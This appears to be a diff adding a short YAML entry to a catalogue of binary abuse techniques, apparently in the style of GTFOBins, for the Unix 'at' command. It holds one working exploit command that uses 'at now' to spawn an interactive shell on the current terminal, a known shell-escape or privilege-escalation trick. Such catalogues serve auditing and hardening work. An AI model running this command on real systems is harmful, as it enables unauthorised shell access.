@@ -1,0 +1,4 @@
+name: at
+binary_path: /usr/bin/at
+exploit_cmds:
+- echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | /usr/bin/at now; tail -f /dev/null
